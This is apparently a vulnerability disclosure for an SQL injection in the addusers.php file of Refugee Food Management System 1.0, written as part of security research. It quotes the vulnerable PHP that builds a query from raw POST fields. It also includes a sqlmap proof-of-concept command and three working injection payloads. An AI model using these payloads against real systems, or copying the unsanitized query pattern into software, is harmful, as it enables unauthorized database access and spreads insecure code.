# SQLi in code-projects Refugee Food Management System 1.0 of file /home/addusers.php

**vender**:

- https://code-projects.org/refugee-food-management-system-in-php-with-source-code/

**SoftLink**:

- https://download.code-projects.org/details/491fdab9-7421-418b-93a2-bb506ba9cf02

**Vulnerable File**

- /home/addusers.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/addusers.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

**injection point: `$_POST['a']`, `$_POST['d']`**

```php
		 <?php
if(isset($_POST['Register'])){
$a = $_POST['a'];
$f =sha1( $_POST['b']);
$l = sha1($_POST['c']);
$n = $_POST['d'];

if($_POST['b'] != $_POST['c']){
   echo "Your passwords did not match.";
}

else {
	
$qry1 = mysql_query("
	insert into  staff
	
	values(
	'',
		'$a',
		'$f',
		'$n'
		
		
	)
```

### POC

```bash
sqlmap -u "http://192.168.93.1/Refugee/home/addusers.php" --data="a=test&b=test&c=test&d=admin&Register=Register"
--cookie="PHPSESSID=66jh6thdtmmgdeh07quvhaj0d3" --tamper=unmagicquotes --level=2 --thread=10 --batch
```

```
---
Parameter: a (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: a=test' RLIKE (SELECT (CASE WHEN (9645=9645) THEN 0x74657374 ELSE 0x28 END)) AND 'JBAA'='JBAA&b=test&c=test&d=admin&Register=Register

    Type: error-based
    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
    Payload: a=test' OR GTID_SUBSET(CONCAT(0x71766a6b71,(SELECT (ELT(4379=4379,1))),0x716a767071),4379) AND 'lkex'='lkex&b=test&c=test&d=admin&Register=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: a=test' OR (SELECT 1475 FROM (SELECT(SLEEP(5)))VtQN) AND 'LWmU'='LWmU&b=test&c=test&d=admin&Register=Register
---
```


